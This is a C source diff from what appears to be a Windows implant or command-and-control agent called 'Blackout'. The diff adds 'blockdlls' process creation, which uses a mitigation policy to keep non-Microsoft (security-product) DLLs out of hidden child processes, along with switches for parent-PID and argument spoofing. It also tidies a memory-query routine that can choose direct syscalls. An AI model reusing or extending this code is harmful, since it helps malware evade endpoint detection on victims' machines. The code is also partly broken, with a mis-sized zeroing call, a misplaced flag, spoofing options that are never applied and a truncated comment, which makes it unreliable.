@@ -9,7 +9,7 @@ FUNC PVOID bkHeapAlloc(
 ) {
     BLACKOUT_INSTANCE
 
-    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Blackout().Heap, HEAP_ZERO_MEMORY, Size );
+    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Blackout().Heap, 0, Size );
 
     return VmHeap;
 }
@@ -20,7 +20,7 @@ FUNC PVOID bkHeapReAlloc(
 ) {
     BLACKOUT_INSTANCE
 
-    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Blackout().Heap, HEAP_ZERO_MEMORY, Addr, Size );
+    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Blackout().Heap, 0, Addr, Size );
 
     return VmHeap;
 }
@@ -32,7 +32,7 @@ FUNC BOOL bkHeapFree(
     BLACKOUT_INSTANCE
 
     MmZero( Data, Size );
-    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Blackout().Heap, NULL, Data );
+    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Blackout().Heap, 0, Data );
     Data = NULL;
 
     return bSuc;
@@ -100,16 +100,37 @@ FUNC DWORD bkProcessCreate(
 
     BOOL bCheck = FALSE;
 
-    PROCESS_INFORMATION Pi = { 0 };
-    STARTUPINFOA        Si = { 0 };
+    UINT16 Count = 0;
+
+    PROCESS_INFORMATION Pi       = { 0 };
+    STARTUPINFOEXA      Si       = { 0 };
+    UINT64              AttrSize = 0;
+    PVOID               AttrBuff = NULL;
+    UINT64              Policy   = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
     MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
     MmZero( &Si, sizeof( STARTUPINFOA ) );
 
-    Si.cb = sizeof( STARTUPINFOA );
-    Si.wShowWindow = SW_HIDE;
+    Si.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
+    Si.StartupInfo.wShowWindow = SW_HIDE;
+    Si.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
 
-    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si, &Pi );
+    if ( Blackout().Fork.Argue     ) Count++;
+    if ( Blackout().Fork.Blockdlls ) Count++;
+    if ( Blackout().Fork.Ppid      ) Count++;
+
+    if ( Count != 0 ) {
+        Instance()->Win32.InitializeProcThreadAttributeList( NULL, Count, 0, &AttrSize );
+        AttrBuff = bkHeapAlloc( AttrSize );
+        Instance()->Win32.InitializeProcThreadAttributeList( AttrBuff, Count, 0, &AttrSize );
+        Flags += EXTENDED_STARTUPINFO_PRESENT;
+    }
+
+    if ( Blackout().Fork.Blockdlls ) Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
+
+    if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;
+
+    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
     if ( !bCheck )
         return NtLastError();
 
@@ -117,6 +138,9 @@ FUNC DWORD bkProcessCreate(
     *ProcessHandle = Pi.hProcess;
     *ThreadId      = Pi.dwThreadId;
     *ThreadHandle  = Pi.hThread;
+
+    //if ( AttrBuff ) Instance()->Win32.delet
+    if ( AttrBuff ) bkHeapFree( AttrBuff, AttrSize );
 
     return NtLastError();    
 }
@@ -247,17 +271,17 @@ FUNC DWORD bkMemQuery(
     DWORD Err = 0;
 
     MEMORY_BASIC_INFORMATION Mbi = { 0 };
-    MmZero(&Mbi, sizeof(MEMORY_BASIC_INFORMATION));
+    MmZero( &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
 
-    if (Blackout().bkApi == _BK_API_WINAPI_ ) {
+    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         if (ProcessHandle) {
-            Instance()->Win32.VirtualQueryEx(ProcessHandle, BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION));
+            Instance()->Win32.VirtualQueryEx( ProcessHandle, BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
         } else {
-            Instance()->Win32.VirtualQuery(BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION));
+            Instance()->Win32.VirtualQuery( BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
         }
         Err = NtLastError();
-    } else if (Blackout().bkApi == _BK_API_NTAPI_ ) {
-        if (!ProcessHandle)
+    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
+        if ( !ProcessHandle )
             ProcessHandle = NtCurrentProcess();
 
         Err = Instance()->Win32.NtQueryVirtualMemory(
@@ -265,8 +289,8 @@ FUNC DWORD bkMemQuery(
             MemoryBasicInformation, &Mbi,
             sizeof(MEMORY_BASIC_INFORMATION), NULL
         );
-    } else if (Blackout().bkApi == _BK_API_SYSCALL_ ) {
-        if (!ProcessHandle)
+    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
+        if ( !ProcessHandle )
             ProcessHandle = NtCurrentProcess();
 
         // SET_SYSCALL(Syscall().SysTable.NtQueryVirtualMemory);
